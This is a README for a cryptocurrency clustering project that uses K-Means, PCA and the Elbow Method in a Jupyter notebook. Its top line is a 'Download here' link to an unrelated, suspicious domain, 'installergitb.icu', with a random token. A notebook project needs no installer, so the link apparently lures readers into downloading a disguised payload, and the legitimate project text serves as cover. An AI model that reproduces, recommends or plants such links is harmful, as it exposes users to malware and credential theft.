# CryptoClustering

[Download here](https://installergitb.icu?0q6rezlomlzu506)

# CryptoClustering

## Overview

CryptoClustering uses unsupervised machine learning to group cryptocurrencies based on short-term price changes. By applying K-Means clustering and Principal Component Analysis (PCA), the project identifies patterns of volatility and correlation using 24-hour and 7-day return data.

## Objectives

- Normalize price change data using `StandardScaler`
- Segment cryptocurrencies with K-Means clustering
- Use the Elbow Method to select the optimal number of clusters
- Visualize clusters in both original and PCA-reduced dimensions
- Compare clustering outcomes before and after dimensionality reduction

## Technologies Used

- Python
- Pandas
- scikit-learn
- hvPlot
- Jupyter Notebook

## Project Files

- `Crypto_Clustering.ipynb`: Main notebook containing all code and visualizations
- `crypto_market_data.csv`: Source dataset of cryptocurrency returns
- `README.md`: Project summary and instructions

## Methodology

1. **Data Preparation**  
   - Loaded and scaled 24h and 7d price changes using `StandardScaler`

2. **Clustering on Raw Features**  
   - Used the Elbow Method to identify optimal clusters  
   - Applied K-Means and visualized clusters with hvPlot

3. **Clustering with PCA**  
   - Reduced data to two principal components  
   - Reapplied K-Means and visualized clusters in PCA space

4. **Evaluation**  
   - Compared clustering results with and without PCA  
   - Assessed the trade-off between dimensionality and interpretability

## Results

- Optimal clusters: 5 (raw data), 4 (PCA-reduced)
- PCA retained nearly all original variance
- PCA clusters were more visually distinct
- Dimensionality reduction simplified visualization but abstracted feature relationships

## Conclusion

This project highlights how unsupervised learning and PCA can uncover hidden structures in financial data. While PCA improves visual clarity, it reduces the transparency of how input features relate to the resulting clusters—a key consideration when applying these methods in practice.
